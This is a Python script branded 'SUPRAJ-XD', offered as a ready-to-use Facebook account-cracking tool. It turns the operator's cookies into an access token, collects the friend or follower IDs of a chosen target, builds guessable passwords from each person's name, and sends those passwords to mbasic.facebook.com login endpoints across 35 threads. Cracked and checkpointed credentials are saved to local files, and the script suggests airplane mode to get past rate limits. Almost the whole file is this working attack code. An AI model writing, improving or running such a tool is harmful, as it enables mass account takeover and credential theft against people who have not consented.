#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import re
import os
import sys
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from time import time as mek

# Colors for terminal output
P = '\x1b[1;97m'  # White
M = '\x1b[1;91m'  # Red
H = '\x1b[1;92m'  # Green
K = '\x1b[1;93m'  # Yellow
B = '\x1b[1;94m'  # Blue
U = '\x1b[1;95m'  # Purple
O = '\x1b[1;96m'  # Cyan
N = '\x1b[0m'     # Reset
J = '\033[38;2;255;127;0;1m'  # Orange

# Global variables
loop, ok, cp = [], [], []
Option = []
data_id = None

# Convert cookies to token
def convert(cookie):
    cookies = {"cookie": cookie}
    try:
        res = requests.get(
            'https://business.facebook.com/business_locations',
            headers={
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
                'referer': 'https://www.facebook.com/',
                'host': 'business.facebook.com',
                'origin': 'https://business.facebook.com',
                'upgrade-insecure-requests': '1',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'text/html; charset=utf-8'
            },
            cookies=cookies
        )
        token = re.search(r'(EAAG\w+)', str(res.text)).group(1)
    except Exception as e:
        print(f"{M}Error converting cookies to token: {e}{N}")
        token = "Cookies Invalid"
    return token

# Real-time function
def real_time():
    return str(mek()).split('.')[0]

# Main class
class Main:
    def __init__(self, token, coki):
        self.token = token
        self.coki = {"cookie": coki}
        self.data_id = []
        self.mbasic = "https://mbasic.facebook.com"

    def get_my_info(self):
        try:
            r = requests.get(
                f"https://graph.facebook.com/me?fields=name,id&access_token={self.token}",
                cookies=self.coki
            ).json()
            self.name, self.id = r['name'], r['id']
            return {'name': self.name, 'id': self.id}
        except KeyError:
            print(f"{M}Token expired or invalid. Removing token and cookies.{N}")
            os.remove("data/token")
            os.remove("data/coki")
            exit(" ! Your token has expired ! ")
        except Exception as e:
            print(f"{M}Error fetching user info: {e}{N}")
            exit(" ! An error occurred ! ")

    def Menu(self):
        try:
            info = self.get_my_info()
        except Exception as e:
            print(f"{M}Error: {e}{N}")
            exit(" ! Failed to fetch user info ! ")

        os.system("clear")
        print(f"""\x1b[1;92m
 ███▄ ▄███▓ █    ██   █████▒ █████▒██▓ ███▄    █ 
▓██▒▀█▀ ██▒ ██  ▓██▒▓██   ▒▓██   ▒▓██▒ ██ ▀█   █ 
▓██    ▓██░▓██  ▒██░▒████ ░▒████ ░▒██▒▓██  ▀█ ██▒
▒██    ▒██ ▓▓█  ░██░░▓█▒  ░░▓█▒  ░░██░▓██▒  ▐▌██▒
▒██▒   ░██▒▒▒█████▓ ░▒█░   ░▒█░   ░██░▒██░   ▓██░
░ ▒░   ░  ░░▒▓▒ ▒ ▒  ▒ ░    ▒ ░   ░▓  ░ ▒░   ▒ ▒ 
░  ░      ░░░▒░ ░ ░  ░      ░      ▒ ░░ ░░   ░ ▒░
░      ░    ░░░ ░ ░  ░ ░    ░ ░    ▒ ░   ░   ░ ░ 
       ░      ░                    ░           ░ 
                                                 
                                        

                                     
 
[\x1b[1;97m•\33[1;97m] Autor  : SUPRAJ-XD \n[\x1b[1;97m•\33[1;97m] Github : SUPRAJ-XD\x1b[1;97m\n---------------------------------------------------------------------""")
        IP = requests.get('https://api.ipify.org').text
        print(f'          {N}[ {O}Welcome To SUPRAJ-XD Tool {N}{O}]\n')
        print(f'{N}[{O}•{N}] IP     : {IP}')
        print(f"[•] Name   : {info['name']}")
        print(f"[•] ID     : {info['id']}")
        print("---------------------------------------------------------------------")
        print(f'{N}[{O}1{N}] CLONE ID FROM FRIENDS')
        print(f'{N}[{O}2{N}] CLONE ID FROM FOLLOWERS')
        print(f'{N}[{O}3{N}] CHECK RESULT OK/CP')
        print(f'{N}[{O}0{N}] LOG OUT, DELETE TOKEN')
        print("---------------------------------------------------------------------")
        chose = input("Choose: ")
        number_list = ['0', '1', '2', '3']
        while chose not in number_list:
            print(' ! Your choice is invalid !')
            chose = input(" > Choose: ")
        if chose == '1' or chose == '2':
            if chose == '1':
                print("\n --------------------------------------------------------------------- \n Turn On Airplane Mode (Flight Mode) if no result \n ---------------------------------------------------------------------")
            else:
                print("\n --------------------------------------------------------------------- \n Turn On Airplane Mode (Flight Mode) if no result \n ---------------------------------------------------------------------")
            account_target = input("Enter Target ID: ")
            print("---------------------------------------------------------------------")
            try:
                r = requests.get(
                    f"https://graph.facebook.com/{account_target}?fields=name,id&access_token={self.token}",
                    cookies=self.coki
                ).json()
                target_name = r['name']
                print(f"\nTarget name: {target_name}")
            except KeyError:
                exit(" ! Target Not Found ! ")
            if chose == '1':
                self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=friends.fields(name,id)&access_token={self.token}", chose="friends")
            else:
                self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=subscribers.limit(5000)&access_token={self.token}", chose="followers")
            self.validate()
        elif chose == '0':
            os.remove('data/token')
            os.remove('data/coki')
            exit(f'\n √ Logout Success, bye {self.name}')
        else:
            print('\n >< Check Results OK & CP ><')
            try:
                print(' >> OK results :')
                for x in open('data/ok', 'r').readlines():
                    print(f' > {x}')
            except:
                print(' > Results 0 ')
            print("", "><" * 25)
            try:
                print(' >> CP results :')
                for x in open('data/cp', 'r').readlines():
                    print(f' > {x}')
            except:
                print(' > Results 0 ')

    def dumpAccount(self, url, chose):
        try:
            r = requests.get(url, cookies=self.coki).json()
            if chose == "friends":
                if 'friends' in r and 'data' in r['friends']:
                    data = r['friends']['data']
                else:
                    print(f"{M}Error: Friends data not found or inaccessible.{N}")
                    return
            else:
                if 'subscribers' in r and 'data' in r['subscribers']:
                    data = r['subscribers']['data']
                else:
                    print(f"{M}Error: Followers data not found or inaccessible.{N}")
                    return
            self.data_id = [f"{x['name']}><{x['id']}" for x in data]
            print(f"TOTAL ID : {len(self.data_id)}")
            self.validate()
        except KeyError:
            print(f"{M}Error: No {chose} data found for the target.{N}")
        except Exception as e:
            print(f"{M}Error fetching {chose} data: {e}{N}")

    def validate(self):
        print("\n >< Cloning Running, (CTRL + C) to stop ><\n")
        with ThreadPoolExecutor(max_workers=35) as executor:
            for x in self.data_id:
                name, id = x.split('><')
                password_list = self.generate_password_list(name)
                executor.submit(self.crack_account, id, password_list)

    def generate_password_list(self, name):
        name_parts = name.split(" ")
        base_passwords = [
            name,
            name_parts[0] + '123',
            name_parts[0] + '1234',
            name_parts[0] + '12345',
            name_parts[0] + '@123',
            name_parts[0] + '@1234',
            name_parts[0] + '@12345',
            name_parts[0] + '123456',
            name_parts[0] + '@12',
            name_parts[0] + 'don123',
            name_parts[0] + '999',
            '12345678@'
        ]
        return base_passwords

    def crack_account(self, user, password_list):
        session = requests.Session()
        for pw in password_list:
            try:
                r = session.get(
                    f"{self.mbasic}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr",
                    headers={
                        'Host': 'mbasic.facebook.com',
                        'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Referer': 'https://mbasic.facebook.com/login/device-based/',
                        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                    }
                )
                soup = BeautifulSoup(r.text, 'html.parser')
                form = soup.find('form', {'method': 'post'})
                data = {x.get('name'): x.get('value') for x in form.find_all('input', {'type': ['hidden', 'submit']})}
                data.update({
                    'uid': user,
                    'next': 'https://mbasic.facebook.com/login/save-device/',
                    'flow': 'login_no_pin',
                    'encpass': f'#PWD_BROWSER:0:{real_time()}:{pw}'
                })
                response = session.post(
                    f"{self.mbasic}/login/device-based/validate-password/",
                    data=data,
                    headers={
                        'Host': 'mbasic.facebook.com',
                        'Origin': 'https://mbasic.facebook.com',
                        'Referer': f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr',
                        'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
                    }
                )
                if "c_user" in session.cookies.get_dict():
                    print(f'\r{H}[SUCCESS] {user} • {pw} •{N}')
                    ok.append(f"{user}|{pw}")
                    with open("data/ok", "a") as f:
                        f.write(f"{user}|{pw}\n")
                    break
                elif "checkpoint" in session.cookies.get_dict():
                    print(f'\r{M}[CHECKPOINT] {user} • {pw} •{N}')
                    cp.append(f"{user}|{pw}")
                    with open("data/cp", "a") as f:
                        f.write(f"{user}|{pw}\n")
                    break
            except Exception as e:
                print(f"{M}Error cracking account {user}: {e}{N}")

# Login function
def _login():
    try:
        os.makedirs("data", exist_ok=True)
    except Exception as e:
        print(f"{M}Error creating data directory: {e}{N}")

    try:
        with open("data/token", "r") as f:
            token = f.read().strip()
        with open("data/coki", "r") as f:
            coki = f.read().strip()
        Success = Main(token=token, coki=coki)
        Success.Menu()
    except FileNotFoundError:
        print("\t >< Cookies not found ><\n ! Please login first !\n")
        coki = input(" > Your cookies: ")
        token = convert(coki)
        if token == "Cookies Invalid":
            exit(" ! Maybe your cookies are invalid ! ")
        with open("data/token", "w") as f:
            f.write(token)
        with open("data/coki", "w") as f:
            f.write(coki)
        Success = Main(token=token, coki=coki)
        Success.Menu()
    except Exception as e:
        print(f"{M}Error during login: {e}{N}")
        exit(" ! An error occurred during login ! ")

# Main execution
if __name__ == "__main__":
    os.system("clear")
    _login()
